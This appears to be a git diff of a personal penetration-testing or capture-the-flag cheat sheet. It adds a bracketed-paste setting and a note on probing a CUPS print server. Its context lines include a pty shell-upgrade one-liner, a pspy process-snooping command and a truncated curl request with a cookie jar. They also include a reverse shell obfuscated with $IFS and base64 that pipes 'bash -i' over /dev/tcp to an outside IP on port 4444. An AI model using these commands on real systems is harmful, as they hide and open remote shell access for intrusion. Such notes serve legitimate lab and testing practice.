@@ -8,6 +8,7 @@
 5. avoid proccess quit 
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+bind 'set enable-bracketed-paste off'
 ```
 6. a reverse shell can use $IFS to without space
 echo$IFS"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41OS80NDQ0IDA+JjEK"|base64$IFS-d|bash
@@ -29,3 +30,6 @@ curl -s -c /tmp/cj -b /tmp/cj -d "action=contract_claim" \
 
 10. pspy https://github.com/DominicBreuker/pspy  
 pspy64 -pf -i 1000
+
+11. port 631 cpus server
+cups-config --version for sniffer
